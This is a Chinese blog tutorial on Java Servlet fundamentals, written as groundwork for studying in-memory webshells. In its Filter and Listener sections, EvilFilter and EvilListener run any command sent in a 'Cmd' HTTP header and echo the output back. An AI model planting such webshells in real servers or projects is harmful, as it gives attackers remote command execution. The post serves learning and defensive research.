---
title: "Java Servlet 基础"
date: 2022-11-03T14:31:34+08:00
lastmod: 2022-11-03T14:31:34+08:00
draft: false
author: "X1r0z"

tags: ['servlet']
categories: ['Java安全']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

最近准备研究研究 Servlet 的几种内存马, 然后发现之前学过的 Servlet 有点忘了... 遂整理 Servlet 基础的相关笔记

文章不会涉及太多细节和深入性的东西, 只是方便日后复习时能够快速回忆相关内容

<!--more-->

## Servlet 介绍

> Servlet (Server Applet), 全称Java Servlet. 是用 Java 编写的服务器端程序. 其主要功能在于交互式地浏览和修改数据, 生成动态 Web 内容. 狭义的 Servlet 是指 Java 语言实现的一个接口, 广义的 Servlet 是指任何实现了这个 Servlet 接口的类, 一般情况下, 人们将 Servlet 理解为后者.
>
> Servlet 运行于支持 Java 的应用服务器中. 从实现上讲, Servlet 可以响应任何类型的请求, 但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web 服务器.
>
> 最早支持 Servlet 标准的是 JavaSoft 的 Java Web Server. 此后, 一些其它的基于 Java 的 Web 服务器开始支持标准的 Servlet.

[https://zh.wikipedia.org/wiki/Java_Servlet](https://zh.wikipedia.org/wiki/Java_Servlet)

目前 Servlet 的版本和 Tomcat 版本的对应关系

[https://tomcat.apache.org/whichversion.html](https://tomcat.apache.org/whichversion.html)

其中 Servlet 3.0 以上开始支持直接使用注解来进行大部分配置, 避免了编写复杂的 web.xml (当然仍然有一些内容必须要用 xml 来配置)

本文以 Java 8 + Servlet 4.0 + Tomcat 8 为基础, 使用 IntelliJ IDEA IDE

## 快速上手

### 创建项目

idea 新建项目 选择 Jakarta EE 生成器

模板选择 Web 应用程序, 并指定 Tomcat 目录

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031459950.png)

版本选择 Java EE 8

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031500863.png)

项目结构

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031501972.png)

main/java 目录存放 Java 源码

resources 目录存放资源文件, 并随 war/jar 一起打包

webapp 目录相当于服务器的 www 目录, 客户端可直接访问

webapp/WEB-INF 目录为安全目录, 客户端无法直接访问, 一般存放 web.xml 以及 class 和 lib 文件

### 配置 Tomcat

右上角选择编辑配置

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031511399.png)

配置 url, jre 以及 http 端口

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031511815.png)

之后点击部署, 配置应用程序上下文方便调试

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031513253.png)

### 编写 Servlet

新建 IndexServlet.java, 内容如下

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        PrintWriter pw = response.getWriter();
        pw.write("<h1>Hello World</h1>");
        pw.flush();
    }
}
```

最后点击运行, 访问网站

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031514662.png)



## Servlet

一个标准的 Servlet 文件如下

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        PrintWriter pw = response.getWriter();
        pw.write("<h1>Hello World</h1>");
        pw.flush();
    }   
}
```

### @WebServlet

Java 中使用 `@WebServlet`  注解来标注 Servlet, 其中 name 指定 Servlet 名称 (可省略), value 指定路由 (必须)

路由有时候也会用 urlPatterns 指定, 两者基本等价, 不过只能二选一, 这里要注意 `/` 路由实际上会接收所有未匹配的路径, 相当于 `/*`

例如我们访问 `/abcd`, 最后处理请求的依然是这个 IndexServlet

详情参考 [http://c.biancheng.net/servlet2/webservlet.html](http://c.biancheng.net/servlet2/webservlet.html)

### Dispatcher

这里借用廖雪峰老师的图

```
               ┌ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┐
               |                                       |
               │            /hello    ┌───────────────┐│
               |          ┌──────────>│ HelloServlet  │|
               │          │           └───────────────┘│
┌───────┐    ┌──────────┐ │ /signin   ┌───────────────┐|
│Browser│───>│Dispatcher│─┼──────────>│ SignInServlet ││
└───────┘    └──────────┘ │           └───────────────┘|
               │          │ /         ┌───────────────┐│
               |          └──────────>│ IndexServlet  │|
               │                      └───────────────┘│
               |              Web Server               |
               └ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ┘
```

Dispatcher 提供路由转发的功能, 浏览器访问服务器时, 会先经过 Dispatcher, 然后 Dispatcher 会根据 Servlet 配置的映射和访问的路径, 将请求转发至对应的 Servlet 进行处理, 这个流程称为 Dispatch

上面讲到的 `/` 路由会匹配 `/` 以及所有未匹配的路径, 也是由 Dispatcher 的处理逻辑导致的

### HttpServlet

一个 Servlet 继承自 HttpServlet 抽象类, HttpServlet 中定义了与 http 请求方法相对应的抽象方法, 以 `do + HTTP 方法动词` 命名

Servlet 支持 get post head put delete options trace 方法

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031532855.png)

需要处理 post 方法就重写 doPost 方法, 以此类推

其它的方法例如 init service destroy 参考 Servlet 生命周期 [http://c.biancheng.net/servlet2/life-cycle.html](http://c.biancheng.net/servlet2/life-cycle.html)

### HttpServletRequest 与 HttpServletResponse

HttpServletRequest 与 HttpServletResponse 分别是 Servlet 对 http 请求和响应的封装, 两者都提供了相关接口方便我们处理 http 数据

HttpServletRequest

- getMethod(): 返回请求方法
- getRequestURI(): 返回请求路径
- getQueryString(): 返回完整请求参数
- getParameter(name): 返回请求参数
- getInputStream(): 获取输入流
- getCookies(): 返回所有 cookie
- getHeader(name): 返回指定 header
- getRemoteAddr(): 返回客户端 ip 地址

另外可以把 HttpServletRequest 当成 map 来用, 一般多用于 Servlet 之间的转发

- getAttribute(key): 设置属性

- setAttribute(key, value): 获取属性

- removeAttribute(key): 删除属性

详情参考 [http://c.biancheng.net/servlet2/httpservletrequest.html](http://c.biancheng.net/servlet2/httpservletrequest.html)

HttpServletResponse

- setStatus(code): 设置相应代码
- setContentType(type): 设置 body 类型
- setCharacterEncoding(charset): 设置字符编码
- setHeader(name, value): 设置 header
- addCookie(cookie): 设置 cookie
- getOutputStream(): 获取输出流
- getWriter(): 获取字符流

详情参考 [http://c.biancheng.net/servlet2/httpservletresponse.html](http://c.biancheng.net/servlet2/httpservletresponse.html)

用 getOutputStream 输出时需要传递 byte 数组, 用 getWriter 输出只需要传递 String

前者多用于文件下载, 后者用于显示文本

另外输出是写在缓冲区的, 最后需要执行一下 flush 方法

例子

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String name = request.getParameter("name");
        String ua = request.getHeader("User-Agent");
        String ip = request.getRemoteAddr();
        response.setContentType("text/html");
        PrintWriter pw = response.getWriter();
        pw.write("your name: " + name + "<br />");
        pw.write("your ip: " + ip + "<br />");
        pw.write("your ua: " + ua + "<br />");
        pw.flush();
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031610686.png)

## 重定向与转发

重定向是客户端重定向, http 返回 301 或者 302 请求并指定 location 跳转

转发是服务端 Servlet 内部的行为, 客户端方面感受不到路由变化

### 重定向

很简单, 利用 HttpServletResponse 的 sendRedirect 方法

```java
response.sendRedirect("http://www.baidu.com/");
```

### 转发

通过 HttpServletRequest 对象获取 RequestDispatcher 并调用 forward 方法

```java
RequestDispatcher rd = request.getRequestDispatcher("/user");
rd.forward(request, response);
```

也可以一步到位

```java
request.getRequestDispatcher("/user").forward(request, response);
```

因为 Servlet 转发时会共享 HttpServletRequest 和 HttpServletResponse 对象, 所以我们可以通过 HttpServletRequest 中的 setAttribute getAttribute 方法来实现在不同的 Servlet 之间共享数据

例子

IndexServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.Map;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        Map userMap = new HashMap<>();
        userMap.put("username", username);
        userMap.put("password", password);
        request.setAttribute("user", userMap);
        RequestDispatcher rd = request.getRequestDispatcher("/user");
        rd.forward(request, response);
    }
}
```

UserServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Map;

@WebServlet(name = "UserServlet", value = "/user")
public class UserServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        Map userMap = (Map) request.getAttribute("user");
        response.setContentType("text/html");
        PrintWriter pw = response.getWriter();
        pw.write("servlet: " + this.getServletName());
        pw.write("<br />");
        pw.write("username: " + userMap.get("username"));
        pw.write("<br />");
        pw.write("password: " + userMap.get("password"));
        pw.flush();
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031629458.png)

可以看到 url 还是 `/` , 并且 ServletName 为 UserServlet

## Session 与 Cookie

### Session

Servlet 中使用 HttpSession 来管理 session, session id 由客户端 cookie 中 `JSESSIONID` 的值来确定

HttpSession

- getId(): 返回 session id
- invalidate(): 销毁 session
- setAttribute(name, value): 设置属性
- getAttribute(name): 获取属性
- removeAttribute(name): 删除属性

详情参考 [http://c.biancheng.net/servlet2/session.html](http://c.biancheng.net/servlet2/session.html)

例子

IndexServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        if ("admin".equals(username) && "123456".equals(password)) {
            HttpSession session = request.getSession();
            session.setAttribute("islogin", true);
            session.setAttribute("username", username);
            response.sendRedirect("/user");
        } else {
            response.setContentType("text/html");
            PrintWriter pw = response.getWriter();
            pw.write("usename or password is incorrect");
            pw.flush();
        }
    }
}
```

UserServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "UserServlet", value = "/user")
public class UserServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        HttpSession session = request.getSession();
        response.setContentType("text/html");
        PrintWriter pw = response.getWriter();
        boolean islogin;
        try {
            islogin = (boolean) session.getAttribute("islogin");
        } catch (NullPointerException e){
            islogin = false;
        }
        if (islogin){
            String username = (String) session.getAttribute("username");
            pw.write("hello:" + username);
        } else {
            pw.write("please login first");
        }
        pw.flush();
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031644805.png)

### Cookie

Servlet 的 cookie 由 Cookie 类实现, 通过带参构造方法实例化对象

```java
Cookie cookie = new Cookie("name", "value");
```

相关方法

- getName(): 获取 cookie 名称
- getValue(): 获取 cookie 值
- setValue(value): 设置 cookie 值

详情参考 [http://c.biancheng.net/servlet2/cookie.html](http://c.biancheng.net/servlet2/cookie.html)

通过 HttpServletResponse 的 addCookie 方法获取 cookie, 通过 HttpServletRequest 的 getCookies 方法获取所有 cookie

因为 cookie 并不是 Servlet 专属, 所以要想获取指定 cookie 需要先把所有 cookie 都遍历一遍才行

例子

IndexServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.HashMap;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String username = request.getParameter("username");
        String password = request.getParameter("password");
        if ("admin".equals(username) && "123456".equals(password)) {
            Cookie cookie = new Cookie("islogin", "1");
            response.addCookie(cookie);
            response.sendRedirect("/user");
        } else {
            response.setContentType("text/html");
            PrintWriter pw = response.getWriter();
            pw.write("usename or password is incorrect");
            pw.flush();
        }
    }
}
```

UserServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "UserServlet", value = "/user")
public class UserServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter pw = response.getWriter();
        Cookie[] cookies = request.getCookies();
        if (cookies != null){
            pw.write("your cookies:");
            pw.write("<br />");
            for (Cookie cookie: cookies){
                pw.write(cookie.getName() + ": " + cookie.getValue());
                pw.write("<br />");
                if (cookie.getName().equals("islogin")){
                    if (cookie.getValue().equals("1")){
                        pw.write("hello user!");
                    } else {
                        pw.write("your are not login!");
                    }
                    pw.write("<br />");
                }
            }
        } else {
            pw.write("no cookies found");
        }
        pw.flush();
    }
}
```

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031703955.png)

## Filter

Servlet Filter 可以拦截客户端发送给 Servlet 的 request, 并修改 Servlet 返回给客户端的 response

工作流程

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031930275.png)



### 创建 Filter

一个标准的 Filter 如下

```java
package com.example.learnservlet.filters;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter(urlPatterns = "/*")
public class UserFilter implements Filter {
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("before");
        filterChain.doFilter(servletRequest, servletResponse);
        System.out.println("after");
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void destroy() {

    }
}
```

Java 中使用 `@WebFilter` 注解来标注 Filter, urlPatterns 指定匹配规则 (参数大部分跟 `@WebServlet` 相同)

一个 Filter 实现自 Filter 接口, 并且必须实现 doFilter 方法, jdk 1.8 版本需要手动重写 init 和 destroy 方法, 高版本不需要

其中 `filterChain.doFilter(servletRequest, servletResponse)` 用于将请求传递至下一个 Filter (如果存在多个 Filter) 或 Servlet

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211031943674.png)

详情参考 [http://c.biancheng.net/servlet2/filter.html](http://c.biancheng.net/servlet2/filter.html)

这里以 Servlet Filter 型内存马的原理为例

IndexServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter pw = response.getWriter();
        pw.write("hello world");
        pw.flush();
    }
}
```

EvilFilter.java

```java
package com.example.learnservlet.filters;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.*;

@WebFilter(urlPatterns = "/*")
public class EvilFilter implements Filter {
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        response.setCharacterEncoding("utf-8");
        PrintWriter pw = response.getWriter();
        if (request.getHeader("Cmd") != null){
            String cmd = request.getHeader("Cmd");
            Process p = Runtime.getRuntime().exec(cmd);
            InputStream in = p.getInputStream();
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String line = null;
            while((line = br.readLine()) != null){
                pw.write(line);
            }
            br.close();
            pw.write("\n");
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void destroy() {

    }
}
```

正常页面

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211032004250.png)

执行命令

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211032004290.png)

### Filter Chain

对于同一条拦截规则可以设置多个 Filter, 这些 Filter 组成一条 Filter Chain, 客户端的请求会依次经过每一个 Filter 并最终达到 Servlet, Servlet 处理完成后再按照相反的顺序将响应回传给对应 Filter, 最终达到客户端

工作流程

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211032008322.png)

Filter 的执行流程类似于栈的 "先进后出", 即第一个拦截 request 的 Filter 最后才拦截 response

详情参考 [http://c.biancheng.net/servlet2/filterchain.html](http://c.biancheng.net/servlet2/filterchain.html)

Filter 的拦截顺序由在 web.xml 配置时的顺序指定, 如果使用注解配置, 那么顺序与实现 Filter 接口的类名有关

例子

IndexServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.Map;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter pw = response.getWriter();
        System.out.println("servlet: hello world");
        pw.write("servlet: hello world");
        pw.flush();
    }
}
```

FilterA.java

```java
package com.example.learnservlet.filters;

import javax.servlet.*;
import javax.servlet.annotation.WebFilter;
import java.io.IOException;

@WebFilter(urlPatterns = "/*")
public class FilterA implements Filter {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("a: before");
        filterChain.doFilter(servletRequest, servletResponse);
        System.out.println("a: after");
    }

    @Override
    public void destroy() {

    }
}
```

FilterB filterC 同理

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211032016691.png)

可以看到执行流程是 `Client <-> FilterA <-> FilterB <-> FilterC <-> Servlet`

## Listener

Listener 即为监听器, 用于监听事件变化并执行相关代码

监听器的相关概念：

- 事件: 方法调用、属性改变、状态改变等。
- 事件源: 被监听的对象( 例如: request、session、servletContext)
- 监听器: 用于监听事件源对象, 事件源对象状态的变化都会触发监听器
- 注册监听器: 将监听器与事件源进行绑定

Listener 有很多种, 详情参考 [http://c.biancheng.net/servlet2/listener.html](http://c.biancheng.net/servlet2/listener.html)

因为一个事件一般仅由一个 Listener 处理, 所以 Listener 的流程和写法相比 Filter 要简单一些

这里以 Servlet Listener 内存马的原理为例 (使用 ServletRequestListener)

IndexServlet.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.HashMap;
import java.util.Map;

@WebServlet(name = "IndexServlet", value = "/")
public class IndexServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html");
        PrintWriter pw = response.getWriter();
        pw.write("hello world");
        pw.flush();
    }
}
```

EvilListener.java

```java
package com.example.learnservlet;

import javax.servlet.*;
import javax.servlet.http.*;
import javax.servlet.annotation.*;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;

import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.*;

@WebListener
public class EvilListener implements ServletRequestListener {
    public EvilListener(){

    }
    @Override
    public void requestDestroyed(ServletRequestEvent sre) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent sre){
        try {
            RequestFacade rf = (RequestFacade) sre.getServletRequest();
            Field f = Class.forName("org.apache.catalina.connector.RequestFacade").getDeclaredField("request");
            f.setAccessible(true);
            Request request = (Request) f.get(rf);
            Response response = request.getResponse();
            PrintWriter pw = response.getWriter();
            if (request.getHeader("Cmd") != null) {
                String cmd = request.getHeader("Cmd");
                Process p = Runtime.getRuntime().exec(cmd);
                InputStream in = p.getInputStream();
                BufferedReader bf = new BufferedReader(new InputStreamReader(in));
                String line = null;
                while ((line = bf.readLine()) != null){
                    pw.write(line);
                }
                pw.write("\n");
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

代码使用了 RequestFacade 结合反射获取 Request 对象, 最终得到 Response, 然后获取 PrintWriter 进行回显

idea 需添加 `org.apache.tomcat:tomcat-catalina` 依赖

正常访问

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211032057450.png)

执行命令

![](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202211032058917.png)

## JSP

JSP 即 Java Server Pages, 其本质仍然是 Servlet, 服务器在运行 JSP 时会将其动态编译为 Servlet class 来执行

JSP 语法跟 Java 一致

### 标签

代码: `<% ... %>`,

注释: `<%-- JSP Comment --%>`

echo 标签: `<%= var %>`

### 对象

JSP 内置了 Servlet 中的部分对象

- out: 表示 HttpServletResponse 的 PrintWriter
- session: 表示当前 HttpSession 对象
- request: 表示当前 HttpServletRequest 对象

可以直接使用

### import 和 include

导入包: `<%@ page import="java.io.*" %>`

引入其它 JSP 文件: `<%@ include file="config.jsp" %>`

## 参考文章

[https://www.liaoxuefeng.com/wiki/1252599548343744/1255945497738400](https://www.liaoxuefeng.com/wiki/1252599548343744/1255945497738400)

[http://c.biancheng.net/servlet2/](http://c.biancheng.net/servlet2/)
